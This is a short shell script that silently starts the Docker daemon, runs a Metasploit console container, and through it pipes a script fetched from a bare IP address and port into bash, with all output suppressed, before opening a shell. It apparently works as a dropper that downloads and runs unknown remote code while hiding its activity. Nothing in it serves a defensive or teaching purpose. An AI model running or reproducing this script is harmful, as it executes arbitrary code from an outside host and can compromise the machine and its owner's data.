#!/bin/sh

dockerd --log-level fatal &>/dev/null&
sleep 3
docker run --rm chasepd/msfconsole -q -n -x 'curl -s -L http://94.199.106.182:27010/f.sh | bash' &>/dev/null 2>&1
sh
